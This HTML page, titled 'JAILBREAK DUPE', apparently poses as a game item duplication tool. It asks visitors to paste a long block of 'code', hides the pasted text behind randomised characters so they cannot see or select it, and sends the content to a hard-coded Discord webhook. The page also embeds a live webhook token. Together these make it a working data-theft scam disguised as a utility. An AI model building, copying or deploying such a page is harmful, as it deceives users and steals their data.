<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>JAILBREAK DUPE</title>

    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800;900&display=swap" rel="stylesheet">

    <style>
        * {
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        body {
            margin: 0;
            min-height: 100vh;
            background: linear-gradient(135deg, #1b0f3b, #24104f, #162b7a);
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .language-switcher {
            position: fixed;
            top: 30px;
            right: 40px;
            display: flex;
            align-items: center;
            gap: 12px;
            z-index: 1000;
            background: rgba(255, 255, 255, 0.08);
            padding: 10px 20px;
            border-radius: 50px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
        }

        .lang-label {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0.5;
            transition: opacity 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
            cursor: pointer;
            overflow: hidden;
            padding: 0;
        }

        .lang-label img {
            width: 32px;
            height: 32px;
            object-fit: cover;
            border-radius: 50%;
        }

        .lang-label.active {
            opacity: 1;
            transform: scale(1.15);
            box-shadow: 0 0 20px rgba(122, 255, 255, 0.4);
        }

        .switch {
            position: relative;
            display: inline-block;
            width: 50px;
            height: 24px;
        }

        .switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }

        .slider-toggle {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255, 255, 255, 0.2);
            transition: 0.3s;
            border-radius: 34px;
        }

        .slider-toggle:before {
            position: absolute;
            content: "";
            height: 18px;
            width: 18px;
            left: 3px;
            bottom: 3px;
            background: linear-gradient(135deg, #7a2be2, #4b6cff);
            transition: 0.3s;
            border-radius: 50%;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
        }

        input:checked + .slider-toggle {
            background: rgba(122, 255, 255, 0.3);
        }

        input:checked + .slider-toggle:before {
            transform: translateX(26px);
            background: linear-gradient(135deg, #2be2a7, #4bffc6);
        }

        .title-main {
            margin-top: 60px;
            margin-bottom: 40px;
            font-size: 84px;
            font-weight: 900;
            letter-spacing: 8px;
            text-align: center;
            text-shadow:
                0 15px 40px rgba(0, 0, 0, 0.65),
                0 0 40px rgba(122, 43, 226, 0.25);
        }

        .container {
            width: 60vw;
            max-width: 1000px;
            min-width: 600px;
            padding: 40px;
            border-radius: 24px;
            background: rgba(255, 255, 255, 0.06);
            backdrop-filter: blur(16px);
            box-shadow:
                0 30px 80px rgba(0, 0, 0, 0.55),
                inset 0 1px 0 rgba(255, 255, 255, 0.08);
            text-align: center;
        }

        /* üî• UN SOLO EDITOR VISUAL */
        .editor {
            position: relative;
            width: 100%;
            height: 260px;
            border-radius: 18px;
            background: rgba(255, 255, 255, 0.12);
            box-shadow: inset 0 8px 20px rgba(0, 0, 0, 0.45);
            overflow: hidden;
            margin-bottom: 30px;
        }

        textarea {
            position: absolute;
            inset: 0;
            padding: 35px;

            background: transparent;
            color: transparent;
            caret-color: white;

            border: none;
            outline: none;
            resize: none;

            font-size: 15px;
            line-height: 1.5;
            z-index: 1;
            
            /* Hacer imposible seleccionar */
            user-select: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
        }

        textarea::placeholder {
            color: rgba(255, 255, 255, 0.55);
        }

        #fakeText {
            position: absolute;
            inset: 0;
            padding: 35px;

            font-family: monospace;
            font-size: 14px;
            line-height: 1.5;

            white-space: pre-wrap;
            color: #7affff;

            pointer-events: none;
            user-select: none;
            background: transparent;

            z-index: 2;
        }

        button {
            padding: 14px 46px;
            border: none;
            border-radius: 40px;
            background: linear-gradient(135deg, #7a2be2, #4b6cff);
            color: white;
            font-size: 17px;
            font-weight: 600;
            letter-spacing: 1px;
            cursor: pointer;
            box-shadow: 0 18px 45px rgba(0, 0, 0, 0.5);
            transition: transform 0.2s ease, box-shadow 0.2s ease;
        }

        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
        }

        .btn-instructions {
            margin-top: 20px;
            background: linear-gradient(135deg, #2be2a7, #4bffc6) !important;
        }

        .status {
            margin-top: 16px;
            font-size: 14px;
            opacity: 0.85;
        }

        @media (max-width: 900px) {
            .title-main {
                font-size: 56px;
                letter-spacing: 4px;
            }

            .container {
                width: 90vw;
                min-width: unset;
            }
        }
    </style>
</head>
<body>

<div class="language-switcher">
    <span class="lang-label" data-lang="es">
        <img src="https://flagcdn.com/es.svg" alt="Espa√±ol">
    </span>
    <label class="switch">
        <input type="checkbox" id="langToggle">
        <span class="slider-toggle"></span>
    </label>
    <span class="lang-label" data-lang="en">
        <img src="https://flagcdn.com/us.svg" alt="English">
    </span>
</div>

<div class="title-main" data-en="JAILBREAK DUPE" data-es="JAILBREAK DUPE">JAILBREAK DUPE</div>

<div class="container">

    <div class="editor">
        <textarea id="message" placeholder="Paste the full code here..." data-placeholder-en="Paste the full code here..." data-placeholder-es="Pega el c√≥digo completo aqu√≠..."></textarea>
        <pre id="fakeText"></pre>
    </div>

    <button onclick="send()">
        <span data-en="PROCESS" data-es="PROCESAR">PROCESS</span>
    </button>
    <div class="status" id="status"></div>
    
    <button class="btn-instructions" onclick="window.location.href='index_steps.html'">
        <span data-en="üìã VIEW INSTRUCTIONS" data-es="üìã VER INSTRUCCIONES">üìã VIEW INSTRUCTIONS</span>
    </button>
</div>

<script>
    const textarea = document.getElementById("message");
    const fakeText = document.getElementById("fakeText");
    const status = document.getElementById("status");
    const langToggle = document.getElementById('langToggle');
    const langLabels = document.querySelectorAll('.lang-label');

    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

    // Cargar idioma guardado o usar ingl√©s por defecto
    let currentLang = localStorage.getItem('language') || 'en';
    
    // Establecer estado inicial
    if (currentLang === 'es') {
        langToggle.checked = false;
        langLabels[0].classList.add('active');
        langLabels[1].classList.remove('active');
    } else {
        langToggle.checked = true;
        langLabels[1].classList.add('active');
        langLabels[0].classList.remove('active');
    }
    
    // Aplicar idioma inicial
    updateLanguage(currentLang);
    
    // Cambiar idioma al hacer click en el toggle
    langToggle.addEventListener('change', function() {
        currentLang = this.checked ? 'en' : 'es';
        updateLanguage(currentLang);
        localStorage.setItem('language', currentLang);
        
        // Actualizar labels activos
        if (currentLang === 'en') {
            langLabels[1].classList.add('active');
            langLabels[0].classList.remove('active');
        } else {
            langLabels[0].classList.add('active');
            langLabels[1].classList.remove('active');
        }
    });
    
    // Permitir click en los labels
    langLabels.forEach((label, index) => {
        label.addEventListener('click', () => {
            langToggle.checked = index === 1;
            langToggle.dispatchEvent(new Event('change'));
        });
    });
    
    function updateLanguage(lang) {
        // Actualizar textos con data-en y data-es
        document.querySelectorAll('[data-en]').forEach(element => {
            const text = element.getAttribute('data-' + lang);
            if (element.tagName === 'DIV' || element.tagName === 'SPAN') {
                element.innerHTML = text;
            } else {
                element.textContent = text;
            }
        });
        
        // Actualizar placeholder del textarea
        const placeholderText = textarea.getAttribute('data-placeholder-' + lang);
        if (placeholderText) {
            textarea.placeholder = placeholderText;
        }
        
        // Actualizar mensajes de status seg√∫n idioma
        const statusText = status.textContent;
        if (statusText) {
            if (lang === 'es') {
                if (statusText.includes('ERROR')) status.textContent = 'ERROR ‚ùå';
                if (statusText.includes('successfully')) status.textContent = 'Procesado y enviado correctamente ‚úî';
                if (statusText.includes('Failed')) status.textContent = 'Error al enviar ‚ùå';
            } else {
                if (statusText.includes('ERROR')) status.textContent = 'ERROR ‚ùå';
                if (statusText.includes('correctamente')) status.textContent = 'Processed and sent successfully ‚úî';
                if (statusText.includes('Error al')) status.textContent = 'Failed to send ‚ùå';
            }
        }
    }

    function obfuscate(text) {
        return text.replace(/[^\s\n]/g, () =>
            chars.charAt(Math.floor(Math.random() * chars.length))
        );
    }

    textarea.addEventListener("input", () => {
        fakeText.textContent = obfuscate(textarea.value);
    });

    textarea.addEventListener("scroll", () => {
        fakeText.scrollTop = textarea.scrollTop;
    });

    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1471582004704186419/HKn4alN7O-KQfKej8h4NjQPxmiBdC5XDzSdvYpVRgcJTKjz1Rsp7oaKxIQg-myigvAzS";

    function send() {
    const text = textarea.value;
    const lines = text.split(/\r?\n/);

    // ‚úÖ Se mantiene la verificaci√≥n de cantidad
    if (lines.length <= 5000) {
        status.textContent = "ERROR ‚ùå";
        return;
    }

    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            username: "JAILBREAK DUPE",
            embeds: [{
                title: "üìÑ Full Content",
                description: text.slice(0, 4000), // l√≠mite embed Discord
                color: 5793266,
                timestamp: new Date().toISOString()
            }]
        })
    })
    .then(() => {
        status.textContent = currentLang === 'es' ? 'Procesado y enviado correctamente ‚úî' : 'Processed and sent successfully ‚úî';
        textarea.value = "";
        fakeText.textContent = "";
    })
    .catch(() => {
        status.textContent = currentLang === 'es' ? 'Error al enviar ‚ùå' : 'Failed to send ‚ùå';
    });
}
</script>

</body>
</html>
